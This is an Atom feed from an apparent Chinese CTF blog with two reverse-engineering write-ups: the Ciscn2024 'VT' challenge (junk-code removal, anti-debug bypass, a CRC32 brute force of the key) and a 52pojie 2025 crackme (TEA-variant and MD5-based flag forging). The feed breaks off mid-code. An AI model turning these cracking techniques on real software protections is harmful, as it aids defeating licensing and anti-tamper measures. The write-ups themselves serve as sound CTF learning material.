<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Liv&#39;s blog</title>
  
  <subtitle>CTF blog</subtitle>
  <link href="https://tkazer.github.io/atom.xml" rel="self"/>
  
  <link href="https://tkazer.github.io/"/>
  <updated>2025-02-21T03:12:00.297Z</updated>
  <id>https://tkazer.github.io/</id>
  
  <author>
    <name>Liv</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ciscn2024-逆向0解题-VT</title>
    <link href="https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/"/>
    <id>https://tkazer.github.io/2025/02/20/Ciscn-reverse-vt/</id>
    <published>2025-02-20T15:36:15.000Z</published>
    <updated>2025-02-21T03:12:00.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ciscn2024-逆向0解题-VT"><a href="#Ciscn2024-逆向0解题-VT" class="headerlink" title="Ciscn2024-逆向0解题-VT"></a>Ciscn2024-逆向0解题-VT</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这题不想吐槽什么，利用开源的混淆项目将代码混淆就是一道题。由于逆向功底不够且花指令样式随机多变，只能手动去除花指令，这部分就花了一个小时左右。当时比赛时看到一坨混淆直接放弃了，现在重新做一遍发现其实花点时间其实也是可以解出的。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="程序分析-开源混淆项目"><a href="#程序分析-开源混淆项目" class="headerlink" title="程序分析&amp;开源混淆项目"></a>程序分析&amp;开源混淆项目</h3><p>首先是例常Die，发现和叠Buff一样的一系列特征。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/1.png" alt="alt text"></p><p>后续在Github上找到了这个混淆的项目（obfus.h），只是用一系列特征来伪造。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/2.png" alt="alt text"></p><p>大概阅览了一下这个混淆项目，就是利用一堆花指令和逻辑混淆处理代码，然后封装了一些常用函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/3.png" alt="alt text"></p><p>这个项目最新版的GetProcAddress是自己重新封装实现的，而通过dbg断点发现题目程序的GetProcAddress是可以断下来的，所以应该是某个历史版本而非最新，至少是在这个版本之前。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/4.png" alt="alt text"></p><h3 id="去除花指令"><a href="#去除花指令" class="headerlink" title="去除花指令"></a>去除花指令</h3><p>这个程序花指令含以下几种（可能没截全），大多都是常规花指令，可以直接按U，再跳过指定字节数，按C重构代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/5.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/6.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/7.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/8.png" alt="alt text"></p><p>然后以下是一个特殊情况的花指令，图1是花指令，图2是去花后的，需要跳过箭头处jmp的第一个0xEB字节，然后再重构代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/9.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/10.png" alt="alt text"></p><p>然后接下来就是重复的操作，这部分可以利用idc脚本进行一键去除，由于我做的时候为了保证去除所有花指令，就都手动操作，花了一个小时左右。</p><h3 id="去花后程序API"><a href="#去花后程序API" class="headerlink" title="去花后程序API"></a>去花后程序API</h3><p>去花重构函数过程中，可以发现有很多这样类似的函数，其实就是之前在开源混淆项目的代码中看到的那些自封装函数，就是封装起来调用系统API的一个代理函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/11.png" alt="alt text"></p><p>大概有这么多，和开源项目里面差不多一致，不过并没有所有api都被调用到。（红叉处是后续分析功能自命名的）</p><p><img src="/2025/02/20/Ciscn-reverse-vt/12.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/13.png" alt="alt text"></p><h3 id="Main函数分析"><a href="#Main函数分析" class="headerlink" title="Main函数分析"></a>Main函数分析</h3><p>通过start函数进入main函数，发现有反调试代码（如IsDebuggerPresent），且在以下代码段发现有通过调用GetCommandLineA获取程序运行的命令行。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/14.png" alt="alt text"></p><p>调试尝试运行后发现程序会使用到命令行运行程序附带的前两个参数。下图这部分代码就是在main函数中将第二个命令行参数通过atoi转成ProcessId进行后续操作，所以第二个参数就应该是某个进程的ID。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/15.png" alt="alt text"></p><p>在下面发现有创建线程的代码，可以看到是创建mark2函数线程（自命名的）。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/35.png" alt="alt text"></p><p>尝试带参调试，看看能不能看mark2里面做了什么。第一个参数随便填，第二个参数随便填一个进程ID（必须要正在运行的进程，如果不是真实PID则Main函数不会阻塞，而是会跳到最后调用Exit函数）。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/16.png" alt="alt text"></p><p>然后断点在Main函数开头处，使用ScyllaHide插件进行一键去反调试。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/17.png" alt="alt text"></p><p>调试运行发现没法执行到创建线程的这个代码段，看汇编段发现是这边判断ecx等于0，所以跳转走了，没有执行。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/18.png" alt="alt text"></p><p>由于不知道这边ecx需要什么条件，直接下条件断点在cmp处，将ecx设置为1，强制执行下面的创建线程代码，便可以进入mark2函数进行下一步分析。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/19.png" alt="alt text"></p><h3 id="Mark2函数分析"><a href="#Mark2函数分析" class="headerlink" title="Mark2函数分析"></a>Mark2函数分析</h3><p>发现有类似被加密的数据（以下称encFlag），部分变量名和函数已经被我重命名了。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/20.png" alt="alt text"></p><p>param1_bytes_2指针进入两层跳转过去发现，数据指向的是我们参数1字符串unhex后的字节数据，所以就可以猜测给param1_bytes_2赋值的函数就是类似unhex函数。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/21.png" alt="alt text"></p><p>然后下面encFlag赋值后进行了重赋值，利用之前的encFlag值，调用一个函数生成了一系列key值，然后用key值异或上param1_bytes_2，这边是i%2，所以就一直循环异或这两个字节，也就是我们输入的参数1进行unhex后的两个字节。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/22.png" alt="alt text"></p><p>由于encFlag之前的值是固定的，所以生成的一系列Key也是固定的，可以直接利用条件断点在给Key赋值的地方将他输出。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/23.png" alt="alt text"></p><p>得到以下Key值列表。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/24.png" alt="alt text"></p><p>在encFlag重赋值下面，调用了一个计算call传入encFlag，计算返回一个4字节数值。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/25.png" alt="alt text"></p><p>且在下面部分可以看到对v22做了一个判断，判断是否为0xF703DF16，若不是，则会执行到这个return直接返回，不会继续执行下面部分代码。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/26.png" alt="alt text"></p><p>在下面未执行代码中看到了类似对encFlag进行解密的函数Call，并且在下面看到了判断解密后数据结尾是否是为’}’，如果是就break。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/27.png" alt="alt text"></p><p>且在最底下代码看到一个printf函数的调用，输出了解密后的字符串。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/28.png" alt="alt text"></p><h3 id="程序流程总结"><a href="#程序流程总结" class="headerlink" title="程序流程总结"></a>程序流程总结</h3><ol><li><p>首先要带两个参数运行程序，第一个参数是4长度字符串，第二个参数是一个正在运行的某个进程ID。</p></li><li><p>满足某个条件创建线程执行mark2函数进行函数主解密流程。</p></li><li><p>将第一个参数进行unhex，转成2字节数据，与固定异或列表进行一次异或计算，再调用一个计算call得到一个4字节数据，并且必须是0xF703DF16。</p></li><li><p>将通过参数1处理后的加密数据进行解密得到flag，然后printf输出。</p></li></ol><p>所以最主要是就是分析calc函数，用代码模拟calc函数进行爆破，得到密钥，也就是参数一那两个字节，接下来就分析calc函数。</p><h3 id="calc函数分析"><a href="#calc函数分析" class="headerlink" title="calc函数分析"></a>calc函数分析</h3><p>从上文可以知道calc函数第一个参数传入一个48长度字节数组，第二个参数是48，那么第二个参数应该就是输入数据的长度。</p><p>通过动调走一遍流程，确定关键计算代码，忽略其他的逻辑混淆。</p><p>最外层是通过len进行一次数据遍历，内层是进行8次的循环。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/29.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/30.png" alt="alt text"></p><p><img src="/2025/02/20/Ciscn-reverse-vt/31.png" alt="alt text"></p><p>可以用c++重写出原始的calc函数代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="爆破密钥（参数一）"><a href="#爆破密钥（参数一）" class="headerlink" title="爆破密钥（参数一）"></a>爆破密钥（参数一）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">calc</span><span class="params">(<span class="type">uint8_t</span>* data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> ret_value = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> count = <span class="number">0</span>; count &lt; len; count++)</span><br><span class="line">&#123;</span><br><span class="line">ret_value ^= data[count];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ret_value &amp; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">ret_value = (ret_value &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">ret_value &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ~ret_value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">short</span> Param1 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 爆破2字节</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">Param1 = i;</span><br><span class="line">        <span class="comment">// ida条件断点得到的key值列表</span></span><br><span class="line"><span class="type">uint8_t</span> KeyList[]&#123;</span><br><span class="line"><span class="number">82</span>,<span class="number">225</span>,<span class="number">68</span>,<span class="number">226</span>,<span class="number">57</span>,<span class="number">225</span>,<span class="number">94</span>,<span class="number">155</span>,<span class="number">81</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">25</span>,<span class="number">152</span>,<span class="number">80</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">193</span>,<span class="number">80</span>,<span class="number">158</span>,<span class="number">82</span>,<span class="number">130</span>,</span><br><span class="line"><span class="number">39</span>,<span class="number">130</span>,<span class="number">38</span>,<span class="number">231</span>,<span class="number">83</span>,<span class="number">128</span>,<span class="number">36</span>,<span class="number">128</span>,<span class="number">66</span>,<span class="number">220</span>,</span><br><span class="line"><span class="number">57</span>,<span class="number">158</span>,<span class="number">2</span>,<span class="number">148</span>,<span class="number">39</span>,<span class="number">129</span>,<span class="number">69</span>,<span class="number">131</span>,<span class="number">81</span>,<span class="number">147</span>,</span><br><span class="line"><span class="number">2</span>,<span class="number">128</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span>,<span class="number">68</span>,<span class="number">129</span> &#125;;</span><br><span class="line"><span class="type">uint8_t</span> Enc[<span class="number">48</span>]&#123;&#125;;</span><br><span class="line"><span class="type">uint8_t</span>* pParam1 = (<span class="type">uint8_t</span>*)(<span class="type">uint64_t</span>)(&amp;Param1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calc之前的异或计算</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">48</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">Enc[j] = pParam1[j % <span class="number">2</span>] ^ KeyList[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> calc_value = <span class="built_in">calc</span>(Enc, <span class="number">48</span>);</span><br><span class="line"><span class="keyword">if</span> (calc_value == <span class="number">0xF703DF16</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Cracked:%02X%02X\n&quot;</span>, pParam1[<span class="number">0</span>], pParam1[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出”Cracked:79BC”，得到密钥为<strong>79BC</strong>。</p><h2 id="获取Flag"><a href="#获取Flag" class="headerlink" title="获取Flag"></a>获取Flag</h2><p>输入密钥和一个正在运行的进程ID，再次进行调试。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/32.png" alt="alt text"></p><p>发现可以正常走到decrypt_flag函数调用处。</p><p><img src="/2025/02/20/Ciscn-reverse-vt/33.png" alt="alt text"></p><p>单步执行完decrypt_flag函数，跳转到flag指针处，即可看到解密后的flag。</p><p><strong>flag{MjExNTY3MzE3NTQzMjI&#x3D;}</strong></p><p><img src="/2025/02/20/Ciscn-reverse-vt/34.png" alt="alt text"></p><h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>这次全流程做下来感觉其实面对复杂的混淆和花指令得有耐心去分析，耐心的动调观察数据变化以及注释关键点，这样才能更好理顺思路和理解代码流程。</p><p>这次花指令全都是手动去除，因为怕写脚本处理的花指令不完整，也就是担心去除的不完整导致程序执行错乱。现在发现其实是可以参考开源的那个混淆项目，看他用到了哪些花指令，然后结合实际汇编进行分析，应该是可以将所有花指令的情况都列出来的，然后进行一键脚本去除。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ciscn2024-逆向0解题-VT&quot;&gt;&lt;a href=&quot;#Ciscn2024-逆向0解题-VT&quot; class=&quot;headerlink&quot; title=&quot;Ciscn2024-逆向0解题-VT&quot;&gt;&lt;/a&gt;Ciscn2024-逆向0解题-VT&lt;/h1&gt;&lt;h2 id=&quot;前</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>吾爱2025-Windows逆向高级题-5</title>
    <link href="https://tkazer.github.io/2025/02/18/Wuai2025Windows5/"/>
    <id>https://tkazer.github.io/2025/02/18/Wuai2025Windows5/</id>
    <published>2025-02-18T09:32:48.000Z</published>
    <updated>2025-02-18T09:33:53.319Z</updated>
    
    <content type="html"><![CDATA[<h1 id="吾爱2025-Windows逆向高级题-5"><a href="#吾爱2025-Windows逆向高级题-5" class="headerlink" title="吾爱2025-Windows逆向高级题-5"></a>吾爱2025-Windows逆向高级题-5</h1><p>考点：异步消息执行，变种tea展开、变种MD5、时间戳、Flag分段检查</p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>这一段是获取两个编辑框的内容，即uid和flag，然后flag要符合异或的那一系列条件，实际格式是flag{…}。</p><p><img src="/2025/02/18/Wuai2025Windows5/1.png" alt="alt text"></p><p>跟到这边发现有一系列函数，main_program里面的执行验证按钮后主流程，execute是main_program里面通过不同消息来执行不同命令的函数。（都是自命名的函数，仅代表个人想法）</p><p><img src="/2025/02/18/Wuai2025Windows5/2.png" alt="alt text"></p><h2 id="execute函数"><a href="#execute函数" class="headerlink" title="execute函数"></a>execute函数</h2><p>其他消息：将flag括号内数据进行unhex（如1122字符串直接转成0x11,0x22数据）</p><p>0x35消息：获取当前半小时整点时间戳数据。</p><p><img src="/2025/02/18/Wuai2025Windows5/3.png" alt="alt text"></p><p>0x55消息：通过利用变种MD5+Salt将解密完数据的前十六字节计算得到4字节数值。</p><p><img src="/2025/02/18/Wuai2025Windows5/4.png" alt="alt text"></p><p>0x25消息：unhex后数据进行解密（Decrypt函数）。</p><p><img src="/2025/02/18/Wuai2025Windows5/5.png" alt="alt text"></p><h2 id="main-program函数"><a href="#main-program函数" class="headerlink" title="main_program函数"></a>main_program函数</h2><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p>获取flag括号内数据通过消息分发执行execute的unhex消息，然后再执行execute的Decrypt函数，解密unhex后的数据，将解密完的数据长度赋值给v12。</p><p><img src="/2025/02/18/Wuai2025Windows5/6.png" alt="alt text"></p><h3 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h3><p>将解密完数据的前16字节进行custom_MD5，得到4字节数据，然后判断解密后数据第17个字节开始四个字节是否和计算得到的4字节数据相等。</p><p>如果相等就再次判断v12，即解密后数据长度，判断是否等于20。</p><p>再调用execute的时间戳获取消息，得到8字节时间戳数据。</p><p>最后再检查解密后数据前8字节是否等于时间戳数据，以及第九个字节往后8字节是否等于编辑框输入的uid。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>输入的flag得是被和Decrypt相对于的加密函数进行加密后的数据，加密前格式：{半时整点时间戳（8字节），uid（8字节），Custom_MD5（前面十六字节）（4字节），0x04填充（四个字节）}</p><p>最后一部分填充会在下面Decrypt函数里面说明来由。</p><p><img src="/2025/02/18/Wuai2025Windows5/7.png" alt="alt text"></p><h2 id="Decrypt函数（sub-7FF7FAC92C40）"><a href="#Decrypt函数（sub-7FF7FAC92C40）" class="headerlink" title="Decrypt函数（sub_7FF7FAC92C40）"></a>Decrypt函数（sub_7FF7FAC92C40）</h2><p>要求unhex后数据长度要是8的倍数，且利用一系列计算得到v12这个数据，参与内部解密的Key生成，最后还要求解密完的数据符合一系列条件验证。</p><p><img src="/2025/02/18/Wuai2025Windows5/8.png" alt="alt text"></p><h3 id="解密后数据条件验证"><a href="#解密后数据条件验证" class="headerlink" title="解密后数据条件验证"></a>解密后数据条件验证</h3><p>从这部分逻辑代码可以分析，他是将最后v8指向最后一个数据，然后v9赋值最后一个数据，然后v8循环递减，直到当前v8指向v8开始往前的第v9个指针结束，然后最后解密后数据长度&#x3D;当前长度-v9。</p><p>已知解密后前面已经占用了20字节（时间戳+uid+md5），在main_program也已知解密后数据长度要等于20，所以可以知道这边v9必须等于4，所以v8等于4，最后这边一共占用4个字节，即{4,4,4,4}，这样经过这边的验证最后的size才会等于20。</p><p><img src="/2025/02/18/Wuai2025Windows5/9.png" alt="alt text"></p><h3 id="dec函数"><a href="#dec函数" class="headerlink" title="dec函数"></a>dec函数</h3><p>将unhex后数据按8字节分块进行tea的解密，tea加密的Key由上一层传入的v12通过RC4得到，且每次解密Key都会变化（固定变化），直接动调就可以拿到几次解密用到的Key值。</p><p><img src="/2025/02/18/Wuai2025Windows5/10.png" alt="alt text"></p><p>下面一系列解密就是tea的解密，不过是展开，可以数出一共是12轮，且Delta直接可以通过两次sum的值相减得到（由于tea解密这边应该是加上sum，ida伪代码展示是减，但是实际计算后数值一样），B979379E就是tea解密用到的Delta。</p><p><img src="/2025/02/18/Wuai2025Windows5/11.png" alt="alt text"></p><p>所以就可以通过动调得到的几次Key和Delta写出tea的加密代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> key1[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xD7851B65</span>,</span><br><span class="line">    <span class="number">0x473457C1</span>,</span><br><span class="line">    <span class="number">0x1231F787</span>,</span><br><span class="line">    <span class="number">0x9ACD6D9A</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key2[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0xB728E994</span>,</span><br><span class="line">    <span class="number">0x1746382E</span>,</span><br><span class="line">    <span class="number">0xC52D865C</span>,</span><br><span class="line">    <span class="number">0x10778A6E</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint32_t</span> key3[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x7459F437</span>,</span><br><span class="line">    <span class="number">0x90D1E5D</span>,</span><br><span class="line">    <span class="number">0x779375B2</span>,</span><br><span class="line">    <span class="number">0xEFCB8541</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="主解题流程"><a href="#主解题流程" class="headerlink" title="主解题流程"></a>主解题流程</h2><p>通过用c++实现这部分代码，获取时间戳数据（8字节）。</p><p><img src="/2025/02/18/Wuai2025Windows5/12.png" alt="alt text"></p><p>然后将uid转为8字节字节数据拼接到时间戳字节后面。</p><p>MD5值暂时填充4个0x00，将MD5值和4个0x04字节拼接上。</p><p>将完整数据进行tea_encrypt，再用flag{}包裹填入编辑框进行验证。</p><p>在MD5生成代码处，断点在箭头处，即可得到MD5四字节数据。</p><p><img src="/2025/02/18/Wuai2025Windows5/13.png" alt="alt text"></p><p>最终再重复上面步骤即可得到flag。</p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_encrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>], sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xB979379E</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> i = <span class="number">0</span>; i &lt; <span 